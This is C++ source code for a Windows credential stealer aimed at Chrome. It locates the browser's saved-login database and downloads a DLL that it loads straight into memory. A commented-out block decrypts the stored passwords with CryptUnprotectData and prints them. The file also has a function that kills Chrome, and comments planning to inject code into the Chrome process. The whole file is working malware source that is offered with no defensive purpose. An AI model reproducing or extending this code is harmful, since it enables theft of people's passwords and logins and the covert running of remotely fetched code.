
// To Implement 
// challenge - When Chrome is running it prevents access to senstive files
// Solution  - Remotely run our code in the Chrome process
// Temp Fix  - Terminate all running Chrome Processess
    
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <shlobj.h>

#pragma comment(lib,"crypt32")//CryptUnprotectData API
#pragma comment(lib,"shell32")//SHGetFolderPath



#include "memory.h"
#include "module.h"
#include "http.h"
#include "database.h"
#include "utility.h"


  

//The CryptUnprotectData API will only decrypt credentials associated with a host machine.
//This means that if your Logins Data file is uploaded, say by malicious  software,
// decryting the credetials will be very hard (not impossible!)
void DecryptDataBlob(unsigned char* pBLOB, char** password, size_t szBLOB)
{
	DATA_BLOB BLOB, data;
	BLOB.pbData = pBLOB;
    BLOB.cbData = szBLOB + 1; //230 bytes (fixed) + 1 (string terming characetr)
		
    if (CryptUnprotectData(&BLOB, NULL, NULL, NULL, NULL, 0, &data))
	{
        for(int i = 0; i<data.cbData; i++)  (*password)[i] = data.pbData[i];	   
        (*password)[data.cbData]='\0';
    }    
}  


void TerminateChrome(void) 
{
	const wchar_t* chromeBrowser = L"chrome.exe";
	DWORD ID = 0;
	
	if(WinSys::isProcessRunning(chromeBrowser, &ID))
WinSys::KillProcess(ID);

	
		return;
}
		

bool LoadRemoteDLL(HANDLE* pHandle)
{
   	HMEMORYMODULE handle;    	
	LPBYTE lpBuffer=NULL;
	DWORD dwSize=0;
	*pHandle= NULL;
    HANDLE hModule = NULL;	
	
	HTTP::DownloadInMemory(&lpBuffer, &dwSize);
	if((hModule = MemoryLoadLibrary(lpBuffer)) == NULL)
	   return false;
   	*pHandle = hModule;	
	return true;
}

void main ()
{	
	FileData TFileData;	
	unsigned char** crypted_pass;// Returns an array of pointers to the deciphered credentials	
	char **login_info, *credArray[20], *pathCredFile = NULL,  *passBuffer2 = NULL;
	DWORD  accessRights = GENERIC_READ, flags = 0, szEntries = 0;
    HANDLE hSQLModule = NULL;	
	login_info = credArray;
	
	//TerminateChrome();
	
	if(FileSys::GetFileDirectory(pathCredFile, 0x1C)) 	
		if(LoadRemoteDLL(&hSQLModule))
			Database::SQLParsing(pathCredFile, hSQLModule);	
	/*	
	if(!(WinSys::IsWindows64()))
    {
		FileSys::MapToMemory(pathCredFile, TFileData, accessRights, flags);// Load the credentials file (Logins Data) for processing
     	//Seperate the data into their respective entries of consisting the encrypted password, login IDs and the domain	
		unsigned char* pData = TFileData.ptr;
		size_t   szData = TFileData.size;
		
		szEntries = Database::RawBinaryParsing(pData, szData, &crypted_pass, login_info);//

		passBuffer2 = (char*)VirtualAlloc(NULL, 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		
		for(int i = 0; i < szEntries; i++)
		{	
			if(crypted_pass[i] != NULL)
			{
				DecryptDataBlob(crypted_pass[i], &passBuffer2, 230); 
				printf("password is: %s\n",passBuffer2);
				*(login_info[i] + 85)= '\0';
				printf("password is: %s\n",login_info[i]);
			}
		}
	}		
	*/
	
	return;
}
 